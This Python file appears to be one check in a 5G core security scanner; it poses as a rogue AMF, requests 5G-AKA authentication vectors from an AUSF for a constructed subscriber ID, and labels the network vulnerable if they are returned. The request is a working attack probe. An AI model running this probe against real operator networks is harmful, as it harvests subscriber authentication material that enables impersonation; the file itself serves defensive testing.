from checks.base_check import BaseCheck, CheckResult
from core import http_client, token_manager
from config import AUSF_URL, MCC, MNC, MNC_PAD, SUPI_START

class AUSFAuthVectorCheck(BaseCheck):
    check_id = "CHECK-006"
    name = "AUSF Auth Vector Harvesting"
    affected_nf = "AUSF"
    endpoint = "POST /nausf-auth/v1/ue-authentications"
    severity = "CRITICAL"

    def run(self) -> CheckResult:
        token = token_manager.get_token("AUSF", "nausf-auth")

        supi = f"imsi-{MCC}{MNC}{str(SUPI_START).zfill(10)}"
        url = f"{AUSF_URL}/nausf-auth/v1/ue-authentications"
        body = {
            "supiOrSuci": supi,
            "servingNetworkName": f"5G:mnc{MNC_PAD}.mcc{MCC}.3gppnetwork.org"
        }

        request = {
            "method": "POST",
            "url": url,
            "headers": {"Authorization": "Bearer <rogue AMF token scoped for nausf-auth>"},
            "body": body
        }

        if not token:
            return self.result(
                status="ERROR",
                request=request,
                response={},
                evidence="Could not obtain token from NRF",
                conclusion="Token request failed — cannot test auth vector harvesting."
            )

        try:
            resp = http_client.post(url, token=token, json=body)

            response = {
                "status_code": resp.status_code,
                "body": resp.text[:500]
            }

            if resp.status_code in [200, 201]:
                return self.result(
                    status="VULNERABLE",
                    request=request,
                    response=response,
                    evidence=f"AUSF returned 5G-AKA auth vectors for {supi} to rogue AMF",
                    conclusion="AUSF does not verify that the requesting AMF is currently "
                               "serving this subscriber. Any rogue NF with a valid token "
                               "can harvest authentication vectors — RAND, HXRES*, AUTN — "
                               "for any subscriber. Enables network impersonation and "
                               "SIM key material analysis."
                )
            elif resp.status_code == 403:
                return self.result(
                    status="PATCHED",
                    request=request,
                    response=response,
                    evidence="AUSF returned 403 — unauthorized access blocked",
                    conclusion="AUSF enforces per-subscriber authorization."
                )
            elif resp.status_code == 404:
                return self.result(
                    status="ERROR",
                    request=request,
                    response=response,
                    evidence="Subscriber not found",
                    conclusion="No subscriber data to test against. Add a subscriber first."
                )
            else:
                return self.result(
                    status="ERROR",
                    request=request,
                    response=response,
                    evidence=f"Unexpected status code {resp.status_code}",
                    conclusion="Unexpected response from AUSF."
                )
        except Exception as e:
            return self.result(
                status="ERROR",
                request=request,
                response={},
                evidence=str(e),
                conclusion="Could not reach AUSF."
            )